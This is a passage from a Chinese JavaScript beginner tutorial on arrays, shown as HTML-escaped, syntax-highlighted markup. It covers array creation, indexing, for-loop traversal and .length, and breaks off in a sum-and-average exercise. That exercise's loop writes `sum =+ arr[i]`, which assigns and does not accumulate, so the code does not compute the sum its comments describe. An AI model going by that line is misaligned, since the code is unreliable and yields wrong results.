&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Array();		&lt;span style=&#34;color:#75715e&#34;&gt;// 创建了一个空的数组
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 利用数组字面量创建数组 []
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;];
    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 我们数组里面的数据一定用逗号分隔
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5. 数组里面的数据 比如1，2 我们称为数组元素
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 6. 获取数组元素 格式：数组名[索引号]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;迪丽热巴&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;古力娜扎&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;佟丽娅&amp;#39;&lt;/span&gt;];
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]);	&lt;span style=&#34;color:#75715e&#34;&gt;// 因为没有这个数组元素，所以输出的结果是 undefined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;82-创建数组&#34;&gt;8.2 创建数组&lt;/h2&gt;
&lt;h3 id=&#34;821-数组的创建方式&#34;&gt;8.2.1 数组的创建方式&lt;/h3&gt;
&lt;p&gt;JS 中创建数组有两种方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用 new 创建数组&lt;/li&gt;
&lt;li&gt;利用数组字面量创建数组&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;822--利用-new-创建数组&#34;&gt;8.2.2  利用 new 创建数组&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;数组名&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Array();
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Array();		&lt;span style=&#34;color:#75715e&#34;&gt;// 创建一个新的空数组
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;这种方式暂且了解，等学完对象再看&lt;/li&gt;
&lt;li&gt;注意 Array()，A要大写&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;823-利用数组字面量创建数组&#34;&gt;8.2.3 利用数组字面量创建数组&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 使用数组字面量方式创建空的数组
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;数组名&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
&lt;span style=&#34;color:#75715e&#34;&gt;// 2. 使用数组字面量方式创建带初始值的数组
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;数组名&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;小白&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;小黑&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;大黄&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;瑞奇&amp;#39;&lt;/span&gt;];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;数组的字面量是方括号[]&lt;/li&gt;
&lt;li&gt;声明数组并赋值称为数组的初始化&lt;/li&gt;
&lt;li&gt;这种字面量方式也是我们以后最多使用的方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;824-数组元素的类型&#34;&gt;8.2.4 数组元素的类型&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;数组中可以存放任意类型的数据，例如字符串，数字，布尔值等等。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arrStus&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;小白&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28.9&lt;/span&gt;];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;825-提问&#34;&gt;8.2.5 提问&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;数组的作用是什么？&lt;/li&gt;
&lt;li&gt;创建数组我们有哪两种方式？哪一种我们最常用？&lt;/li&gt;
&lt;li&gt;什么是数组元素？数组里面类型有限制吗？&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;83-获取数组中的元素&#34;&gt;8.3 获取数组中的元素&lt;/h2&gt;
&lt;h3 id=&#34;831-数组的索引&#34;&gt;8.3.1 数组的索引&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;索引（下标）&lt;/strong&gt;：用来访问数组元素的序号（数组下标从0开始）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200510174155.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数组可以通过&lt;strong&gt;索引&lt;/strong&gt;来访问，设置、修改对应的数组元素，我们可以通过“&lt;strong&gt;数组名[索引]&lt;/strong&gt;”的形式来获取数组中的元素。&lt;/li&gt;
&lt;li&gt;这里的&lt;strong&gt;访问&lt;/strong&gt;就是获取得到的意思。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 定义数组
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arrStus&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
&lt;span style=&#34;color:#75715e&#34;&gt;// 获取数组中的第2个元素
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arrStus&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;课堂练习&#34;&gt;课堂练习&lt;/h3&gt;
&lt;p&gt;定义一个数组，里面存放星期一、星期二&amp;hellip; 直到星期日（共7天），在控制台输出：星期日，请同学们自己动手完成。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;星期一&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;星期二&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;星期三&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;星期四&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;星期五&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;星期六&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;星期日&amp;#39;&lt;/span&gt;];
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;84-遍历数组&#34;&gt;8.4 遍历数组&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;问：数组中的每一项我们怎么取出来？&lt;/li&gt;
&lt;li&gt;答：可以通过“数组名[索引]”的方式一项项的取出来。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;];
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);	&lt;span style=&#34;color:#75715e&#34;&gt;// red
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);	&lt;span style=&#34;color:#75715e&#34;&gt;// green
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]);	&lt;span style=&#34;color:#75715e&#34;&gt;// blue
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;问：怎么把数组里面的元素全部取出来？&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;规律&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从代码中我们可以发现，从数组中取出每一个元素时，代码是重复的，有所不一样的是&lt;strong&gt;索引值在递增&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;答案就是&lt;strong&gt;循环&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;遍历&lt;/strong&gt;：就是把数组中的每个元素从头到尾都访问一次（类似我们每天早上学生的点名）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 遍历数组：就是把数组的元素从头到尾访问一次
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;]);
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 因为我们的数组索引号从0开始，所以i必须从0开始 i&amp;lt;3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 输出的时候 arr[i] i计数器当索引号来用
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    
    &lt;span style=&#34;color:#75715e&#34;&gt;// 数组长度
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 数组长度 数组名.length
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;关羽&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;张飞&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;马超&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;赵云&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;黄忠&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;刘备&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;姜维&amp;#39;&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;]);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;]);
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 数组的长度是元素个数，不要跟索引号混淆
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. arr.length 动态检测数组元素的个数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;案例1&#34;&gt;案例1&lt;/h3&gt;
&lt;p&gt;求数组`[2, 6, 1, 7, 4]``里面所有元素的和以及平均值。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;案例分析：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;声明1个求和变量sum&lt;/li&gt;
&lt;li&gt;遍历这个数组，把里面每个数组元素加到 sum 里面&lt;/li&gt;
&lt;li&gt;用求和变量 sum 除以数组的长度就可以得到数组的平均值&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 声明1个求和变量sum
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 遍历这个数组，把里面每个数组元素加到 sum 里面
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 用求和变量 sum 除以数组的长度就可以得到数组的平均值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;average&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;];		&lt;span style=&#34;color:#75715e&#34;&gt;// 我们要加的是数组元素 arr[i] 不是计数器 i
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;average&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;;
